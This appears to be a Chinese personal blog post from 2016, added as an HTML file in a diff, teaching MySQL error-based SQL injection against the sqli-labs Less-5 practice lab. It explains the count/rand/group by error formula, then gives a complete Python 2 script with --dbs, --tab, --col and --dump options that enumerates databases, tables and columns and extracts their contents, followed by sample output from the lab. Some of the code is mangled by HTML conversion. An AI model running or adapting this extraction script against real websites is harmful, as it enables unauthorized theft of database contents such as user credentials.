@@ -1,0 +1,197 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>sql注入报错注入 | liuqi</title>
+  <meta name="author" content="liuqi">
+  
+  <meta name="description" content="吃吃睡睡终其一生">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="sql注入报错注入"/>
+  <meta property="og:site_name" content="liuqi"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">liuqi</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-06T13:22:27.000Z"><a href="/2016/07/06/sql注入报错注入/">2016-07-06</a></time>
+      
+      
+  
+    <h1 class="title">sql注入报错注入</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>#利用方式#<br>count()、rand()、group by三者缺一不可<br>报错注入用一个公式，只要套用公式即可，公式如下:<br><figure class="highlight plain"><figcaption><span>and (select 1 from (select count(),concat( floor(rand(0)*2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )–+</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">```</div><div class="line">* 公式解析</div><div class="line">Floor()是取整数</div><div class="line">Rand()在0和1之间产生一个随机数</div><div class="line">Rand(rand()*2)将取到0和2的随机数</div><div class="line">Floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的</div><div class="line">Count(*)用来统计结果的，相当于刷新一次结果</div><div class="line">Group by 在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在</div><div class="line">的话count(*)加1，在使用group by时floor(rand(0)*2)会被执行一次，不存在记录，洗标会再执行一次</div><div class="line">**1.猜测闭合字符**</div><div class="line">![image](https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/1.png?raw=true)</div><div class="line">多了一个单引号所有闭合字符为单引号</div><div class="line"></div><div class="line">![image](https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/2.png?raw=true)</div><div class="line">**猜测列数**</div><div class="line">![image](https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/3.png?raw=true)</div><div class="line">**尝试得到显示位**</div><div class="line">![image](https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/4.png?raw=true)</div><div class="line">**报错得到数据库个数**</div><div class="line">![image](https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/5.png?raw=true)</div><div class="line">![image](https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/6.png?raw=true)</div><div class="line">**报错得到数据库的表名**</div><div class="line">![image](https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/7.png?raw=true)</div><div class="line">**报错得到数据库的列的数量**</div><div class="line">![image](https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/8.png?raw=true)</div><div class="line">**报错得到数据库的列名**</div><div class="line">![image](https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/9.png?raw=true)</div><div class="line">**得到列的值**</div><div class="line">![image](https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/4/10.png?raw=true)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">附上报错注入的代码</div></pre></td></tr></table></figure></p>
+<p>#coding=utf-8</p>
+<p>#<a href="http://127.0.0.1/sqli-labs-master/Less-5/?id=1" target="_blank" rel="external">http://127.0.0.1/sqli-labs-master/Less-5/?id=1</a></p>
+<p>import sys<br>import binascii<br>import requests<br>import re</p>
+<p>def http_get(url):<br>    return (requests.get(url))</p>
+<p>def getAllDatabases(url):<br>    dbs_url = url + “‘+and(select 1 from(select count(<em>),concat((select (select (select concat(0x7e7e3a7e7e, count(distinct+table_schema),0x7e7e3a7e7e) from information_schema.tables)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+”</p>
+<pre><code>#print (dbs_url)
+respon = http_get(dbs_url)
+data_html = respon.content
+#print (html)
+dbs_num = int(re.search(r&apos;~~:~~(\d*?)~~:~~&apos;,data_html).group(1))
+print (&quot;databases:%s&quot;% dbs_num)
+print &quot;-------------&quot;
+dbs = []
+for index in xrange(0,dbs_num):
+    db_name_url = url + &quot;&apos;+and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e7e3a7e7e, table_schema, 0x7e7e3a7e7e) from information_schema.tables limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % index
+    #print db_name_url
+    respon = http_get(db_name_url)
+    database_html = respon.content
+    db_name = re.search(r&apos;~~:~~(.*?)~~:~~&apos;,database_html).group(1)
+    dbs.append(db_name)
+    print &quot;|  %s  |&quot; % db_name
+print &quot;-------------&quot;
+</code></pre><p>def getAlltables(url,db_name):</p>
+<pre><code># print (url)
+# print (db_name)
+db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
+tables_num_url = url + &quot;&apos;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e, count(table_name), 0x7e7e3a7e7e)  from information_schema.tables where table_schema=%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % db_name_hex
+html = http_get(tables_num_url).content
+tables_num = int(re.search(r&apos;~~:~~(\d*?)~~:~~&apos;, html).group(1))
+print &quot;Databases:%s  Table: %d&quot; % (db_name, tables_num)
+print &quot;Table:&quot;
+print &quot;-------------&quot;
+for index in xrange(0,tables_num):
+    tables_name_url = url + &quot;&apos;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e, table_name, 0x7e7e3a7e7e) from information_schema.tables where table_schema=%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (db_name_hex, index)
+    html = http_get(tables_name_url).content
+    table_name = re.search(r&apos;~~:~~(.*?)~~:~~&apos;, html).group(1)
+    print &quot;|  %s  |&quot; % table_name
+print &quot;-------------&quot;
+</code></pre><p>def getAllcolumns(url,database,table):<br>    db_name_hex = “0x” + binascii.b2a_hex(database)<br>    table_name_hex = “0x” + binascii.b2a_hex(table)<br>    columns_url = url + “‘+and(select 1 from(select count(<em>),concat((select (select ( select concat(0x7e7e3a7e7e,count(column_name),0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+”%(table_name_hex,db_name_hex)<br>    html = http_get(columns_url).content<br>    columns_num = int(re.search(r’<del>:</del>(\d<em>?)<del>:</del>‘, html).group(1))<br>    print “Databases:%s  Table: %s  Columns:%d” % (database,table,columns_num)<br>    print “Columns:”<br>    print “————-“<br>    for index in xrange(0,columns_num):<br>        columns_url = url + “‘+and(select 1 from(select count(</em>),concat((select (select ( select concat(0x7e7e3a7e7e, column_name, 0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a) –+” % (table_name_hex,db_name_hex,index)<br>        html = http_get(columns_url).content<br>        columns_name = re.search(r’<del>:</del>(.</em>?)<del>:</del>‘, html).group(1)<br>        print “|  %s  |” % columns_name<br>    print “————-“</p>
+<p>def getAllcontents(url,database,table,column):<br>    column_content_url = url + “‘+and(select 1 from(select count(<em>),concat((select (select ( select concat(0x7e7e3a7e7e, count(</em>), 0x7e7e3a7e7e) from %s.%s)) from information_schema.tables limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a) –+”%(database,table)<br>    html = http_get(column_content_url).content<br>    columns_num = int(re.search(r’<del>:</del>(\d</em>?)<del>:</del>‘, html).group(1))<br>    print “Databases:%s  Table: %s  Columns:%d” % (database,table,columns_num)<br>    print “Columns:”<br>    print “————-“<br>    for index in xrange(0,columns_num):<br>        column_content_url = url + “‘+and(select 1 from(select count(<em>),concat((select (select ( select concat(0x7e7e3a7e7e,%s,0x7e7e3a7e7e) from %s.%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+” % (column,database,table,index)<br>        html = http_get(column_content_url).content<br>        column_content_name = re.search(r’<del>:</del>(.*?)<del>:</del>‘, html).group(1)<br>        print “|  %s  |” % column_content_name<br>    print “————-“</p>
+<p>def main():<br>    if sys.argv[1] == ‘–dbs’:<br>        getAllDatabases(sys.argv[2])<br>    elif sys.argv[1] == ‘–tab’:<br>        getAlltables(sys.argv[2],sys.argv[3])<br>    elif sys.argv[1] == ‘–col’:<br>        getAllcolumns(sys.argv[2],sys.argv[3],sys.argv[4])<br>    elif sys.argv[1] == ‘–dump’:<br>        getAllcontents(sys.argv[2],sys.argv[3],sys.argv[4],sys.argv[5])<br>    else:<br>        print (‘What…’)</p>
+<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    main()</p>
+<h1 id="C-Python27-gt-python-E-POC-python-shell-sql-py-–dbs-http-127-0-0-1-sqli-labs-m"><a href="#C-Python27-gt-python-E-POC-python-shell-sql-py-–dbs-http-127-0-0-1-sqli-labs-m" class="headerlink" title="C:\Python27&gt;python E:\POC\python\shell\sql.py –dbs http://127.0.0.1/sqli-labs-m"></a>C:\Python27&gt;python E:\POC\python\shell\sql.py –dbs <a href="http://127.0.0.1/sqli-labs-m" target="_blank" rel="external">http://127.0.0.1/sqli-labs-m</a></h1><h1 id="aster-Less-5-id-1"><a href="#aster-Less-5-id-1" class="headerlink" title="aster/Less-5/?id=1"></a>aster/Less-5/?id=1</h1><h1 id="databases-23"><a href="#databases-23" class="headerlink" title="databases:23"></a>databases:23</h1><h1 id="————"><a href="#————" class="headerlink" title="————-"></a>————-</h1><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="|  information_schema  |"></a>|  information_schema  |</h1><h1 id="bbs"><a href="#bbs" class="headerlink" title="|  bbs  |"></a>|  bbs  |</h1><h1 id="book"><a href="#book" class="headerlink" title="|  book  |"></a>|  book  |</h1><h1 id="challenges"><a href="#challenges" class="headerlink" title="|  challenges  |"></a>|  challenges  |</h1><h1 id="dvwa"><a href="#dvwa" class="headerlink" title="|  dvwa  |"></a>|  dvwa  |</h1><h1 id="dvwaa"><a href="#dvwaa" class="headerlink" title="|  dvwaa  |"></a>|  dvwaa  |</h1><h1 id="guestbook"><a href="#guestbook" class="headerlink" title="|  guestbook  |"></a>|  guestbook  |</h1><h1 id="hack"><a href="#hack" class="headerlink" title="|  hack  |"></a>|  hack  |</h1><h1 id="kppw26"><a href="#kppw26" class="headerlink" title="|  kppw26  |"></a>|  kppw26  |</h1><h1 id="lol"><a href="#lol" class="headerlink" title="|  lol  |"></a>|  lol  |</h1><h1 id="mysql"><a href="#mysql" class="headerlink" title="|  mysql  |"></a>|  mysql  |</h1><h1 id="paimai"><a href="#paimai" class="headerlink" title="|  paimai  |"></a>|  paimai  |</h1><h1 id="C-Python27-gt-python-E-POC-python-shell-sql-py-–tab-http-127-0-0-1-sqli-labs-m"><a href="#C-Python27-gt-python-E-POC-python-shell-sql-py-–tab-http-127-0-0-1-sqli-labs-m" class="headerlink" title="C:\Python27&gt;python E:\POC\python\shell\sql.py –tab http://127.0.0.1/sqli-labs-m"></a>C:\Python27&gt;python E:\POC\python\shell\sql.py –tab <a href="http://127.0.0.1/sqli-labs-m" target="_blank" rel="external">http://127.0.0.1/sqli-labs-m</a></h1><h1 id="aster-Less-5-id-1-book"><a href="#aster-Less-5-id-1-book" class="headerlink" title="aster/Less-5/?id=1 book"></a>aster/Less-5/?id=1 book</h1><h1 id="Databases-book-Table-2"><a href="#Databases-book-Table-2" class="headerlink" title="Databases:book  Table: 2"></a>Databases:book  Table: 2</h1><h1 id="Table"><a href="#Table" class="headerlink" title="Table:"></a>Table:</h1><h1 id="————-1"><a href="#————-1" class="headerlink" title="————-"></a>————-</h1><h1 id="content"><a href="#content" class="headerlink" title="|  content  |"></a>|  content  |</h1><h1 id="user"><a href="#user" class="headerlink" title="|  user  |"></a>|  user  |</h1><h1 id="————-2"><a href="#————-2" class="headerlink" title="————-"></a>————-</h1><h1 id="C-Python27-gt-python-E-POC-python-shell-sql-py-–col-http-127-0-0-1-sqli-labs-m"><a href="#C-Python27-gt-python-E-POC-python-shell-sql-py-–col-http-127-0-0-1-sqli-labs-m" class="headerlink" title="C:\Python27&gt;python E:\POC\python\shell\sql.py –col http://127.0.0.1/sqli-labs-m"></a>C:\Python27&gt;python E:\POC\python\shell\sql.py –col <a href="http://127.0.0.1/sqli-labs-m" target="_blank" rel="external">http://127.0.0.1/sqli-labs-m</a></h1><h1 id="aster-Less-5-id-1-book-user"><a href="#aster-Less-5-id-1-book-user" class="headerlink" title="aster/Less-5/?id=1 book user"></a>aster/Less-5/?id=1 book user</h1><h1 id="Databases-book-Table-user-Columns-3"><a href="#Databases-book-Table-user-Columns-3" class="headerlink" title="Databases:book  Table: user  Columns:3"></a>Databases:book  Table: user  Columns:3</h1><h1 id="Columns"><a href="#Columns" class="headerlink" title="Columns:"></a>Columns:</h1><h1 id="————-3"><a href="#————-3" class="headerlink" title="————-"></a>————-</h1><h1 id="id"><a href="#id" class="headerlink" title="|  id  |"></a>|  id  |</h1><h1 id="username"><a href="#username" class="headerlink" title="|  username  |"></a>|  username  |</h1><h1 id="password"><a href="#password" class="headerlink" title="|  password  |"></a>|  password  |</h1><h1 id="————-4"><a href="#————-4" class="headerlink" title="————-"></a>————-</h1><h1 id="C-Python27-gt-python-E-POC-python-shell-sql-py-–dump-http-127-0-0-1-sqli-labs"><a href="#C-Python27-gt-python-E-POC-python-shell-sql-py-–dump-http-127-0-0-1-sqli-labs" class="headerlink" title="C:\Python27&gt;python E:\POC\python\shell\sql.py –dump http://127.0.0.1/sqli-labs-"></a>C:\Python27&gt;python E:\POC\python\shell\sql.py –dump <a href="http://127.0.0.1/sqli-labs-" target="_blank" rel="external">http://127.0.0.1/sqli-labs-</a></h1><h1 id="master-Less-5-id-1-book-user-username"><a href="#master-Less-5-id-1-book-user-username" class="headerlink" title="master/Less-5/?id=1 book user username"></a>master/Less-5/?id=1 book user username</h1><h1 id="Databases-book-Table-user-Columns-7"><a href="#Databases-book-Table-user-Columns-7" class="headerlink" title="Databases:book  Table: user  Columns:7"></a>Databases:book  Table: user  Columns:7</h1><h1 id="Columns-1"><a href="#Columns-1" class="headerlink" title="Columns:"></a>Columns:</h1><h1 id="————-5"><a href="#————-5" class="headerlink" title="————-"></a>————-</h1><h1 id="ttttt"><a href="#ttttt" class="headerlink" title="|  ttttt  |"></a>|  ttttt  |</h1><h1 id="ccccc"><a href="#ccccc" class="headerlink" title="|  ccccc  |"></a>|  ccccc  |</h1><h1 id="ddddd"><a href="#ddddd" class="headerlink" title="|  ddddd  |"></a>|  ddddd  |</h1><h1 id="xiaohong"><a href="#xiaohong" class="headerlink" title="|  xiaohong  |"></a>|  xiaohong  |</h1><h1 id="xiao"><a href="#xiao" class="headerlink" title="|  xiao  |"></a>|  xiao  |</h1><h1 id="xiaohong-1"><a href="#xiaohong-1" class="headerlink" title="|  xiaohong  |"></a>|  xiaohong  |</h1><h1 id="xiaoxiao"><a href="#xiaoxiao" class="headerlink" title="|  xiaoxiao  |"></a>|  xiaoxiao  |</h1><h1 id="————-6"><a href="#————-6" class="headerlink" title="————-"></a>————-</h1><p>```</p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+        
+  <div class="addthis addthis_toolbox addthis_default_style">
+    
+      <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+    
+    
+      <a class="addthis_button_tweet"></a>
+    
+    
+      <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+    
+    
+      <a class="addthis_button_pinterest_pinit" pi:pinit:layout="horizontal"></a>
+    
+    <a class="addthis_counter addthis_pill_style"></a>
+  </div>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js"></script>
+
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">Kommentare</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://yoursite.com/2016/07/06/sql注入报错注入/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Suche">
+    <input type="hidden" name="q" value="site:yoursite.com">
+  </form>
+</div>
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2016 liuqi
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
